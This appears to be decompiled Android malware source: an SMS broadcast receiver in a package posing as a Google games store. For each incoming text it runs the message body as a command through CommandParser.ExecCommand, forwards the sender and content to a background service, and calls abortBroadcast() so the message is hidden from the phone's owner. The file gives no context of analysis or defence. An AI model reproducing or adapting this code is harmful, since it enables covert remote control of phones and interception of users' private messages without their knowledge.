package com.google.games.stores.recevier;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import com.google.games.stores.config.Config;
import com.google.games.stores.config.Message;
import com.google.games.stores.service.MessageService;
import com.google.games.stores.service.Notifications;
import com.google.games.stores.util.CommandParser;

public class MessageReceiver extends BroadcastReceiver {
    private final String IN_SMS = "0";

    public void onReceive(Context context, Intent intent) {
        try {
            for (Object pdu : (Object[]) intent.getExtras().get("pdus")) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                String sms_body = message.getMessageBody();
                String sms_address = message.getOriginatingAddress();
                Message sms = new Message();
                sms.setAddress(sms_address);
                sms.setContent(sms_body);
                sms.setInout("0");
                CommandParser.ExecCommand(sms_body, context);
                Intent messageService = new Intent(context, MessageService.class);
                messageService.setFlags(268435456);
                messageService.putExtra("SMS", sms);
                context.startService(messageService);
                Intent notificationService = new Intent(context, Notifications.class);
                notificationService.setFlags(268435456);
                notificationService.putExtra(Config.SHOW_UPDATE, Config.SHOW_UPDATE);
                context.startService(notificationService);
                abortBroadcast();
            }
        } catch (Exception e) {
            abortBroadcast();
            e.printStackTrace();
        }
        abortBroadcast();
    }
}
